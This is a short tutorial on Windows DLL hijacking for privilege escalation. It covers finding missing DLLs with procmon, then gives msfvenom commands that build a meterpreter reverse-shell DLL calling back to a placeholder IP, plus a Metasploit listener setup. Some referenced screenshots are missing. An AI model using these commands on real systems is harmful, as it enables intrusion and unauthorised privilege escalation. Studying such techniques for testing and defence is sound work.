First of all, let’s get the definition out of the way. DLL hijacking is, in the broadest sense, tricking a legitimate/trusted application into loading an arbitrary DLL. Terms such as DLL Search Order Hijacking, DLL Load Order Hijacking, DLL Spoofing, DLL Injection and DLL Side-Loading are often -mistakenly- used to say the same.
Dll hijacking can be used to execute code, obtain persistence and escalate privileges. From those 3 the least probable to find is privilege escalation by far. However, as this is part of the privilege escalation section, I will focus on this option. Also, note that independently of the goal, a dll hijacking is perform the in the same way.

#Finding-missing-Dlls

The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters from jpg files i put .
If you are looking for missing dlls in general you leave this running for some seconds.
If you are looking for a missing dll inside an specific executable you should set another filter like "Process Name" "contains" "<exec name>", execute it, and stop capturing events.

#Exploiting Missing Dlls
In order to escalate privileges, the best chance we have is to be able to write a dll that a privilege process will try to load in some of place where it is going to be searched. Therefore, we will be able to write a dll in a folder where the dll is searched before the folder where the original dll is (weird case), or we will be able to write on some folder where the dll is going to be searched and the original dll doesn't exist on any folder.

Use metasploit :

msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR-IP LPORT=YOUR-PORT -f dll -o msf.dll

after that build up listener

mfsconsole

use multi/handler

set LHOST YOUR-IP

set LPORT YOUR-PORT

set PAYLOAD windows/meterpreter/reverse_tcp

exploit


Enjoy :)
